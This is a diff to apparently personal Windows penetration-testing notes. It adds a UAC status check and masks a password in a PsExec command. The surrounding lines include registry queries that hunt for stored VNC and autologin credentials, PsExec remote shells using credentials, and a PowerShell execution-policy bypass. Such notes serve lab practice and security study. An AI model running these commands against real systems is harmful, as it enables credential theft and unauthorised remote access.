@@ -25,6 +25,12 @@ reg query "HKCU\Software\ORL\WinVNC3\Password"
 Windows Autologin:
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
 
+#is UAC enabled ?
+REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
+    EnableLUA    REG_DWORD    0x0  // NO
+    EnableLUA    REG_DWORD    0x1  // YES
+
+
 SNMP Parameters:
 reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
 
@@ -54,7 +60,7 @@ mput *   ##confirm with yes on all files . Maybe /y will help ?
 ##  PsExec.exe –accepteula
 
 PsExec64.exe -accepteula \\10.11.1.49 -u user -p somepassword cmd
-powershell -ExecutionPolicy Bypass C:\Users\Public\PsExec.exe -accepteula \\localhost -u alice -p aliceishere cmd
+powershell -ExecutionPolicy Bypass C:\Users\Public\PsExec.exe -accepteula \\localhost -u alice -p XXXX cmd
 
     PsExec - execute processes remotely
     PsFile - shows files opened remotely
